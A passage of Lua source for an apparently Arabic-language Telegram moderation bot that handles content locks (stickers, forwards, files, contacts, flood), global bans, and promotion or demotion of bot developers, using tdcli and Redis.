elseif text == 'قفل الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الكيبورد بالطرد')  
end,nil)   
elseif text == 'فتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح الكيبورد')  
end,nil)   
end
if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الملصقات بالحذف')  
end,nil)   
elseif text == 'قفل الملصقات بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الملصقات بالتقيد')  
end,nil)   
elseif text == 'قفل الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الملصقات بالكتم')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الملصقات بالطرد')  
end,nil)   
elseif text == 'فتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الملصقات')  
end,nil)   
end
if text == 'قفل التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل التوجيه بالحذف')  
end,nil)   
elseif text == 'قفل التوجيه بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل التوجيه بالتقيد')  
end,nil)   
elseif text == 'قفل التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل التوجيه بالكتم')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل التوجيه بالطرد')  
end,nil)   
elseif text == 'فتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح التوجيه')  
end,nil)   
end
if text == 'قفل الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الملفات بالحذف')  
end,nil)   
elseif text == 'قفل الملفات بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الملفات بالتقيد')  
end,nil)   
elseif text == 'قفل الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الملفات بالكتم')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الملفات بالطرد')  
end,nil)   
elseif text == 'فتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الملفات')  
end,nil)   
end
if text == 'قفل السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل السيلفي بالحذف')  
end,nil)   
elseif text == 'قفل السيلفي بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل السيلفي بالتقيد')  
end,nil)   
elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل السيلفي بالكتم')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل السيلفي بالطرد')  
end,nil)   
elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح السيلفي')  
end,nil)   
end
if text == 'قفل الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙تـم قفـل الماركداون بالحذف')  
end,nil)   
elseif text == 'قفل الماركداون بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙تـم قفـل الماركداون بالتقيد')  
end,nil)   
elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙تـم قفـل الماركداون بالكتم')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙تـم قفـل الماركداون بالطرد')  
end,nil)   
elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙تـم فتح الماركداون')  
end,nil)   
end
if text == 'قفل الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الجهات بالحذف')  
end,nil)   
elseif text == 'قفل الجهات بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الجهات بالتقيد')  
end,nil)   
elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الجهات بالكتم')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الجهات بالطرد')  
end,nil)   
elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الجهات')  
end,nil)   
end
if text == 'قفل الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الكلايش بالحذف')  
end,nil)   
elseif text == 'قفل الكلايش بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الكلايش بالتقيد')  
end,nil)   
elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الكلايش بالكتم')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الكلايش بالطرد')  
end,nil)   
elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الكلايش')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' and Mod(msg) then 
redis:hset('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,'⌔︙ تم قفل التكرار بالطرد')
elseif text == 'قفل التكرار' and Mod(msg) then 
redis:hset('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,'⌔︙ تم قفل التكرار')
elseif text == 'قفل التكرار بالتقيد' and Mod(msg) then 
redis:hset('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,'⌔︙ تم قفل التكرار بالتقيد')
elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
redis:hset('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,'⌔︙ تم قفل التكرار بالكتم')
elseif text == 'فتح التكرار' and Mod(msg) then 
redis:hdel('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,'⌔︙ تم فتح التكرار')
end
--------------------------------------------------------------------------------------------------------------
if text == ("مسح قائمه العام") and Sudo_id(msg) then
redis:del('Spyder:'..bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n⌔︙ تم مسح قائمه العام')
return false
end
if text == ("قائمه العام") and Sudo_id(msg) then
local list = redis:smembers('Spyder:'..bot_id..'GBan:User')
t = "\n⌔︙ قائمة المحظورين عام \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end

if text == ("حظر عام") and msg.reply_to_message_id_ and Sudo_id(msg) then
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "⌔︙ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⌔︙ لا تسطيع حظر البوت عام")
return false 
end
redis:sadd('Spyder:'..bot_id..'GBan:User', result.sender_user_id_)
Group_Kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر عام @(.*)$")  and Sudo_id(msg) then
local username = text:match("^حظر عام @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⌔︙ لا تسطيع حظر البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "⌔︙ لا يمكنك حظر المطور الاساسي \n")
return false 
end
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم حظره عام من المجموعات'
texts = usertext..status
redis:sadd('Spyder:'..bot_id..'GBan:User', result.id_)
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and Sudo_id(msg) then
local userid = text:match("^حظر عام (%d+)$")
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "⌔︙لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⌔︙ لا تسطيع حظر البوت عام")
return false 
end
redis:sadd('Spyder:'..bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ and Sudo_id(msg) then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
redis:srem('Spyder:'..bot_id..'GBan:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and Sudo_id(msg) then
local username = text:match("^الغاء العام @(.*)$")
function start_function(extra, result, success)
if result.id_ then
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء حظره عام من المجموعات'
texts = usertext..status
redis:srem('Spyder:'..bot_id..'GBan:User', result.id_)
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and Sudo_id(msg) then
local userid = text:match("^الغاء العام (%d+)$")
redis:srem('Spyder:'..bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("مسح المطورين") and Sudo_id(msg) then
redis:del('Spyder:'..bot_id..'Set:Sudo_bot')
send(msg.chat_id_, msg.id_, "\n⌔︙  تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and Sudo_id(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Sudo_bot')
t = "\n⌔︙ قائمة مطورين البوت \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مطور") and msg.reply_to_message_id_ and Sudo_id(msg) then
function start_function(extra, result, success)
redis:sadd('Spyder:'..bot_id..'Set:Sudo_bot', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور @(.*)$") and Sudo_id(msg) then
local username = text:match("^رفع مطور @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Sudo_bot', result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مطور في البوت'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end

if text and text:match("^رفع مطور (%d+)$") and Sudo_id(msg) then
local userid = text:match("^رفع مطور (%d+)$")
redis:sadd('Spyder:'..bot_id..'Set:Sudo_bot', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and Sudo_id(msg) then
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Set:Sudo_bot', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and Sudo_id(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Sudo_bot', result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المطورين'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^تنزيل مطور (%d+)$") and Sudo_id(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
redis:srem('Spyder:'..bot_id..'Set:Sudo_bot', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
